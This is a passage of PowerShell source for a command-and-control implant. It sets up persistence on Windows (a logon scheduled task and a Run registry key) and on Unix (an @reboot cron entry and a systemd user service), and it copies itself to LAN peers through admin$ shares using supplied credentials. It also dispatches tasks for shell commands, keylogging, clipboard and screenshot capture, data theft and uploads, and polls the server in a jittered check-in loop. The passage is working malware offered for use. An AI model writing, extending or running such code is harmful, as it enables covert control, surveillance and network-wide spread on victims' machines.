        $progdata = if ($env:ProgramData) { $env:ProgramData } else { 'C:\ProgramData' }
        $launcherDir = Join-Path $progdata 'c2update'
        New-Item -ItemType Directory -Path $launcherDir -Force | Out-Null
        $wrapper = Join-Path $launcherDir 'c2relaunch.cmd'
        "@echo off`r`nstart `"`" /b $relaunch`r`n" | Set-Content -LiteralPath $wrapper -Encoding ASCII
        $lines += "persistence: wrote launcher $wrapper"

        $r = & schtasks /Create /TN 'c2agent-persist' /TR "`"$wrapper`"" `
            /SC ONLOGON /RL HIGHEST /F 2>&1
        $lines += ($r -join "`n")
        $code = $LASTEXITCODE

        $r2 = & reg add 'HKCU\Software\Microsoft\Windows\CurrentVersion\Run' `
            /v c2agent /t REG_SZ /d $wrapper /f 2>&1
        $lines += ($r2 -join "`n")
        $code2 = $LASTEXITCODE
        return @{ output = Transform-Output ($lines -join "`n"); exit_code = 0; error = '' }
    } catch {
        return @{ output = Transform-Output "persistence error: $_"; exit_code = 1; error = "$_" }
    }
}

function Persist-Unix {
    $cfg = Join-Path ([Environment]::GetFolderPath('UserProfile')) '.config\c2update'
    New-Item -ItemType Directory -Path $cfg -Force | Out-Null
    $dest = Join-Path $cfg 'c2agent.ps1'
    Copy-Item -LiteralPath $MyInvocation.MyCommand.Path -Destination $dest -Force
    $relaunch = Get-RelaunchCmd $dest
    $lines = @()
    $lines += "persistence: copied self to $dest"
    $cron = '@reboot ' + $relaunch + ' # c2agent-persist'
    $blk = {
        $cron = $args[0]
        $existing = if (Get-Command crontab -ErrorAction SilentlyContinue) {
            (crontab -l 2>$null) | Where-Object { $_ -notmatch 'c2agent-persist' }
        } else { $null }
        $all = @($existing) + $cron
        $all | crontab - 2>&1
        $LASTEXITCODE
    }
    $r1 = & powershell -NoProfile -ExecutionPolicy Bypass -Command $blk $cron 2>&1
    $lines += ($r1 -join "`n")
    $unit = Join-Path $cfg 'c2-update.service'
    "[Unit]`nDescription=c2 update`n`n[Service]`nType=simple`nExecStart=/bin/sh -c '$relaunch'`nRestart=always`n`n[Install]`nWantedBy=default.target`n" |
        Set-Content -LiteralPath $unit -Encoding ASCII
    $r2 = & systemctl --user daemon-reload 2>&1; & systemctl --user enable --now $unit 2>&1
    $lines += ($r2 -join "`n")
    $code = if ($LASTEXITCODE -eq 0) { 0 } else { 1 }
    return @{ output = Transform-Output ($lines -join "`n"); exit_code = $code; error = '' }
}

# ----------------------------------------------------------------------
# Task: lateral
# ----------------------------------------------------------------------
function Get-LanPeers([string]$subnet) {
    $peers = New-Object System.Collections.Generic.HashSet[string]
    $me = Get-LocalIp
    $base = ''
    if ($subnet) {
        $parts = $subnet -split '\.'
        if ($parts.Count -ge 3) { $base = $parts[0..2] -join '.' }
    }
    elseif ($me -match '^\d+\.\d+\.\d+\.\d+$') {
        $parts = $me -split '\.'
        $base = $parts[0..2] -join '.'
    }
    if (-not $base) { return @() }
    $arpOut = ''
    try { $arpOut = (& arp -a 2>$null) -join "`n" } catch {}
    foreach ($m in [regex]::Matches($arpOut, '\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b')) {
        $ip = $m.Value
        if ($ip.StartsWith($base + '.') -and $ip -ne $me) { [void]$peers.Add($ip) }
    }
    [void]$peers.Remove('0.0.0.0')
    [void]$peers.Remove('255.255.255.255')
    $result = @($peers | Sort-Object)
    if ($result.Count -gt 30) { $result = $result[0..29] }
    return $result
}

function Deploy-WindowsPeer([string]$hostIp, [string]$user, [string]$pwd) {
    $share = "\\$hostIp\admin$"
    $r = & net use $share /user:$user "$pwd" 2>&1
    if ($LASTEXITCODE -ne 0) {
        return 'failed (net use: ' + (($r -join '; ').Trim()) + ')'
    }
    $src = $Script:ThisScript
    $remote = "$share\" + [IO.Path]::GetFileName($src)
    $r = & cmd /c copy /y "`"$src`"" "`"$remote`"" 2>&1
    if ($LASTEXITCODE -ne 0) {
        & net use $share /delete /y 2>&1 | Out-Null
        return 'failed (copy: ' + (($r -join '; ').Trim()) + ')'
    }
    $r = & schtasks /Create /S $hostIp /TN 'c2agent-lateral' /TR "`"$remote`"" `
        /SC ONLOGON /RU $user /RP $pwd /RL HIGHEST /F 2>&1
    & net use $share /delete /y 2>&1 | Out-Null
    if ($LASTEXITCODE -ne 0) {
        return 'deployed (file dropped; task: ' + (($r -join '; ').Trim()) + ')'
    }
    return 'deployed (file dropped + scheduled c2agent-lateral)'
}

function Invoke-LateralTask([object]$argsMap) {
    $subnet = (Get-ShortString $argsMap.subnet).Trim()
    $user = (Get-ShortString $argsMap.user).Trim()
    $pwd = (Get-ShortString $argsMap.pass).Trim()
    if (-not $user) { $user = $env:C2_LAT_USER }
    if (-not $pwd) { $pwd = $env:C2_LAT_PASS }
    $peers = Get-LanPeers $subnet
    if ($peers.Count -eq 0) {
        return @{ output = 'lateral: no LAN peers found'; exit_code = 1; error = '' }
    }
    $lines = @()
    $lines += "lateral: $($peers.Count) peer(s): $($peers -join ', ')"
    $deployed = 0; $failed = 0; $skipped = 0
    foreach ($hostIp in $peers) {
        if (-not $user -or -not $pwd) {
            $status = 'skipped (no credentials; set C2_LAT_USER/C2_LAT_PASS)'
        }
        else {
            $status = Deploy-WindowsPeer $hostIp $user $pwd
        }
        $lines += "  ${hostIp}: $status"
        if ($status -like 'deployed*') { $deployed++ }
        elseif ($status -like 'skipped*') { $skipped++ }
        else { $failed++ }
    }
    $lines += "lateral: deployed=$deployed failed=$failed skipped=$skipped"
    return @{ output = Transform-Output ($lines -join "`n"); exit_code = 0; error = '' }
}

# ----------------------------------------------------------------------
# Task dispatch
# ----------------------------------------------------------------------
function Execute-Task($task) {
    $taskId = [string]$task.task_id
    $type = [string]$task.type
    $argsMap = $task.args
    if ($null -eq $argsMap) { $argsMap = @{} }
    Log "running task $taskId ($type)"
    switch ($type) {
        'shell'       { return Invoke-ShellTask $argsMap }
        'download'    { return Invoke-DownloadTask $taskId $argsMap }
        'upload'      { return Invoke-UploadTask $taskId $argsMap }
        'sleep'       { return Invoke-SleepTask $argsMap }
        'keylog'      { return Invoke-KeylogTask $argsMap }
        'clipboard'   { return Invoke-ClipboardTask $argsMap }
        'screenshot'  { return Invoke-ScreenshotTask $taskId $argsMap }
        'steal'       { return Invoke-StealTask $taskId $argsMap }
        'clone'       { return Invoke-CloneTask $argsMap }
        'persistence' { return Invoke-PersistenceTask $argsMap }
        'lateral'     { return Invoke-LateralTask $argsMap }
        'exit' {
            $Script:KeepLooping = $false
            return @{ output = 'exiting'; exit_code = 0; error = ''; _exit = $true }
        }
        default {
            return @{ output = "unknown task type: $type"; exit_code = 1; error = '' }
        }
    }
}

# ----------------------------------------------------------------------
# Main loop
# ----------------------------------------------------------------------
try {
    $Script:AgentId = Load-State
    if (-not $Script:AgentId) { Register-Agent }

    $rng = [System.Random]::new()
    while ($Script:KeepLooping) {
        try {
            foreach ($task in (Get-Tasks)) {
                try {
                    $result = Execute-Task $task
                    Send-Result ([string]$task.task_id) $result
                    if ($result._exit) { $Script:KeepLooping = $false; break }
                } catch {
                    Send-Result ([string]$task.task_id) @{
                        output = 'agent error'; exit_code = 1; error = "$_"
                    }
                }
            }
        } catch {
            Log "checkin failed: $_"
        }
        $delay = [math]::Max(0.5, $Script:RuntimeInterval + ($rng.NextDouble() * $Script:RuntimeJitter))
        Start-Sleep -Seconds $delay
    }
}
finally {
    foreach ($job in $CloneJobs.Values) {
        Stop-Job -Job $job -ErrorAction SilentlyContinue
        Remove-Job -Job $job -Force -ErrorAction SilentlyContinue
    }
    $Http.Dispose()
}